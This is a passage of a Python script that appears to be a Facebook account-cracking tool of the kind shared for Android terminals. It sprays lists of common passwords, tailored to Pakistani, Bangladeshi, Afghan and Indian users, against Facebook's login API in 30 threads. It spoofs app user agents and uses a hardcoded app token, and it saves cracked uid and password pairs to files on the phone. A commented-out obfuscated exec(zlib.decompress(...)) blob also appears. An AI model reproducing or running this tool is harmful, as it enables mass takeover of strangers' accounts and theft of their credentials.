...
#exec(zlib.decompress(b'x\x9c}\xccA\x0e@0\x10\x05\xd0\xab\xfc\x1d\x16XXJ\xdc\xa5t\xc4$\xa3\xaa3\x95\xb8\xbdX\x10+\x07xo\xd3FO5Z\xcb"rD\x0e\x1c\xd4\x9c\x08\x12\xed\x99\xd4\x14\xd3\xe2\x92\'CN"<v`\x1f\x1c&J\xc63\xa3>1\xa0\xf5t\xb4!\x8b\xf4w\xf1\x04\xbf\xee\xdd?\xba\xa8.k\xe33\x11')u
...
xxnx="[FBAN/FB4A;FBAV/'+fbav+';252.0.0.22.355;FBBV/'+fbbv+';191850142;FBDM/{density=3.9375,width=1440,height=2899};FBLC/en_US;FBRV/'+fbrv+';192501019;FBCR/GLOBE;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1917;FBSV/'+fbsv+';10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
ua  =  "[FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.6.1;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]'+fbsv+';FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]','[FBAN/MessengerLiteForiOS;FBAV/'+fbav+';FBBV/'+fbbv+';FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/'+fbsv+';FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]"
folder_path = '/sdcard/SUDAIR'
try:
...
def Main_ZIDI():
        ...
        if shm =='1':
            ...
            os.system(f'xdg-open https://chat.whatsapp.com/JGCZkexEfn6KguBFVvtRQO/{wp}')
            Main_ZIDI()
        elif shm =='5':
...
def file_crack():
    ...
    try:
        ...
        print(' [+] File location not found ');exit()
    clear()
    print(' [1] Method 1 ')
    linex()
    ...
    for i in range(ps_limit):
        plist.append(input(' Put Password No.{i+1}: '))
    with tred(max_workers=30) as ZIDI:
        clear()
        tl = str(len(fo))
        print(' Total accounts : '+tl)
        print(' Process Running in the Background ')
        linex()
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if methd =='1':
                ZIDI.submit(api1,ids,names,passlist)
            else:
                ZIDI.submit(api1,ids,names,passlist)
    print('\033[1;37m')
    linex()
...
def r_crack():
    ...
    print('  [3] India Cloning PLUS (AFG)')
...
def gmail():
                ...
                with tred(max_workers=30) as Aking:
                        ...
                        for user in fo:
                                ...
                                Aking.submit(random,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def pak():
    ...
    with tred(max_workers=30) as ZIDI:
        ...
        print(' [+] Used Flight Mode For Speed Up')
        linex()
        for psx in user:
            ids = code+psx
            passlist = [psx,ids,'malik1234','khanbaba','ali123','janjan','786787','alimalik','ali786','khanzada','khankhan','khan786','malik123','kingkhan','khan1122','khan123456','khan1234','khan123']
            ZIDI.submit(rd1,ids,passlist)
    print('\033[1;37m')
    linex()
    print(' [+] The process has completed')
    print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def bd():
    ...
    with tred(max_workers=30) as ZIDI:
        ...
        tl = str(len(user))
        print(' [+] Total accounts : '+tl)
        print(' [+] Selected code  :l '+code)
        print(' [+] Process has been started ')
        linex()
        for psx in user:
            ids = code+psx
            passlist = ['i love you','iloveyou','first8','last8','first6','last6','102030','203040','506070','708090',ids,psx]
            ZIDI.submit(rd1,ids,passlist)
    print('\033[1;37m')
    linex()
    print(' [+] The process has completed')
...
def afg():
    ...
    with tred(max_workers=30) as ZIDI:
        ...
        for psx in user:
            ids = code+psx
            passlist = [ids,psx,'100200','700800','afghanistan','afghan1234','afghan123','first8','last8','first6','last6','57273200','102030','405060','708090','10002000']
            ZIDI.submit(rd1,ids,passlist)
    print('\033[1;37m')
    linex()
    print(' [+] The process has completed')
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write('\r [ULTRA]  %s|  OK:-%s '%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                es = random.choice(['es_ES'])
                cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
                xxnx = '[FBAN/FB4A;FBAV/'+fbav+';252.0.0.22.355;FBBV/'+fbbv+';191850142;FBDM/{density=3.9375,width=1440,height=2899};FBLC/en_US;FBRV/'+fbrv+';192501019;FBCR/GLOBE;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1917;FBSV/'+fbsv+';10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
                ua  = '[FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';[FBAN/FB4A;FBAV/'+fbav+';252.0.0.22.355;FBBV/'+fbbv+';191850142;FBDM/{density=3.9375,width=1440,height=2899};FBLC/en_US;FBRV/'+fbrv+';192501019;FBCR/GLOBE;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1917;FBSV/'+fbsv+';10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
                ...
                if 'session_key' in po:
                        ...
                        print('\r\r\033[1;32m [LEGEND-OK] '+uid+' | '+pas)
                        #print('\033[97;1m[Cookies] == '+cookie)
                        file_path_ok = os.path.join(folder_path, 'SILENT_RND_OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'SILENT_COOKIEs.txt')
                        ...
                        #print(f'\r\r\33[1m\33[1;35m [ZIDI-CP] '+uid+' | '+pas+'\033[1;97m')
                        file_path = os.path.join(folder_path, 'ALONE-CP.txt')
...
def api1(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
            network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
            #xxx = "[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.7,width=992,height=1429};FBLC/en_US;FBRV/'+fbrv+';FBCR/GLOBE;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-G710VM;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:;FBNT/4G;FBCN/Verizon;FBSR/36.229.69.32;]','[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.3,width=1044,height=1966};FBLC/en_US;FBRV/'+fbrv+';FBCR/GLOBE;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-G710VM;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:;FBNT/4G;FBCN/Verizon;FBSR/162.68.77.125;]','[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.7,width=959,height=2474};FBLC/en_US;FBRV/'+fbrv+';FBCR/GLOBE;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-G710VM;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:;FBNT/WiFi;FBCN/Sprint;FBSR/53.198.2.75;]'
            xxnx = "[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/vivo;"+"FBBD/vivo;"+"FBPN/com.facebook.katana;"+"FBDV/vivo 1724;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/vivo;"+"FBBD/vivo;"+"FBPN/com.facebook.orca;"+"FBDV/V2043;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;]"
            ua  =  '[FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';[FBAN/FB4A;FBAV/'+fbav+';252.0.0.22.355;FBBV/'+fbbv+';191850142;FBDM/{density=3.9375,width=1440,height=2899};FBLC/en_US;FBRV/'+fbrv+';192501019;FBCR/GLOBE;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1917;FBSV/'+fbsv+';10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
            #ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/'+fbrv+';FBCR/MTS RUS;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1906;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:;]"
            head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if 'session_key' in po:
                    uid = str(po['uid'])
                    print('\r\r\033[1;32m     [SHRUOD -OK] '+uid+' | '+pas)
                    file_path = os.path.join(folder_path, 'SILENT_FILE_OK.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r\r\33[1m\33[1;35m [SHRUOD-CP] '+uid+' | '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'SHRUOD-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    cps.append(uid)
                    break
